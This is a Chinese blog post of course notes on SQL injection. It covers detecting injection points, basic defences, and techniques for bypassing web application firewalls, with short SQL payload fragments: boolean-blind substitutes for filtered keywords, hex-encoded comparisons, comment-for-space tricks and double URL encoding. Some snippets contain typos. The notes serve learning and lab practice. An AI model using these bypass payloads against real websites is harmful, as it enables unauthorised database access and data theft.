---
layout:       post
title:        "极客时间Web安全笔记"
subtitle:     "null"
date:         2020-10-27 02:49:54
author:       "NeptLiang"
header-img:   "img/home-bg.jpg"
header-mask:  0.3
catalog:      true
multilingual: true
tags:
    - Sec
    - WebSec
---


# 0x00 前言

Null

---


# 22. SQL注入实战：判断SQL注入点&防御方式

*TIPS:带参数的动态网页且该网页访问了数据库，就有可能存在SQL注入*

## 一、注入点判断：单引号判断法

字符型整型都可

* *靶机：sqli-labs, xforburp.com, bwapp*

* *注不出数据的时候可尝试加`%`应对LIKE查询*

## 二、防御

### (1) 减少错误信息反馈
### (2) 对输入的特殊符号进行转义（黑名单机制）

`\x00`		`\n`	`\r`	`\`	`'`	`"`	`\x1a`

### (3) 对输入的特殊词组进行过滤（黑名单机制）（PHP的`mysql_escape_string`）

`and` `or` `union` `select` 空格

---


# 34 SQL注入实战：如何绕过WAF之混淆注入原理

大小写绕过

* *字段名也不是大小写敏感的*

---


# 35 SQL注入实战：如何绕过WAF之`union`、`where`、`limit`过滤绕过

## 一、`&&`和`||`绕过

用`&&`和`||`替代`and`和`or`

## 二、`union`过滤绕过

原来的 
```sql
union select user, password from users
```

替换成 
```sql
|| (select user from users where user_id=1) = 'admin'
```

这里`||`的使用类似于布尔盲注

## 三、`where`过滤绕过

原来的 
```sql
|| (select user from users where user_id=1) = 'admin'
```
替换成 
```sql
|| (select user from users limit 1,1) = 'admin'
```

## 四、`limit`过滤绕过

原来的 
```sql
|| (select user from users limit 1,1) = 'admin'
```

替换成 
```sql
|| (select min(user) from group by user_id having user_id=1) = 'admin'
```

通过`having`选择`group`并通过`min`从中取出单个user

---


# 36 SQL注入实战：如何绕过WAF之`group by`、`select`、单引号、`hex`、`unhex`、`substr`绕过

## 一、`group by`过滤绕过
原来的 
```sql
|| (select min(user from group by user_id having user_id=1) 'admin'
```

替换成 
```sql
|| select substr((select group_comcat(name)name from test), 1, 1) = 't'
```

## 二、`select`及单引号过滤绕过

原来的 
```sql
|| select substr((select group_concat(name)name from test), 1, 1) = 't'
```

替换成 
```sql
|| substr(name, 1, 1)=0x74
```
或 
```sql
|| substr(name, 1, 1)=unhex(74)
```

这里`||`的使用类似于布尔盲注，使用时可以不要`select`；

用**十六进制值**逐个字符进行判断就不需要引号了

## 三、`hex`、`unhex`及`substr`过滤绕过——`binary`

原来的 
```sql
|| substr(name, 1, 1) = unhex(74)
```

替换成 
```sql
|| binary(name) = 0x74657374
```

`binary`返回数据的十六进制值

---


# 37 SQL注入实战：如何绕过WAF之空格、等号、双写、双重编码绕过

## 一、空格过滤绕过

```sql
select/**/name/**/from/**/test;
```

或通过**URL编码**绕过WAF

## 二、等号过滤绕过

使用`like`关键字代替等号

## 三、双写绕过

## 四、双重编码绕过

有些WAF只解析一次URL编码后过滤，如果**编码两次**的话就可能会绕过WAF，并被后端执行

## 五、转义函数也不是万能的

## 六、总的来说，分为以下几种方式

1. SQL语句的同义变形体
2. 利用WAF规则设定的缺陷（如双写）
3. 利用技术链中间环节绕过（如编码）

![公众号二维码](https://neptliang.github.io/img/Article/WeChatBlog.png)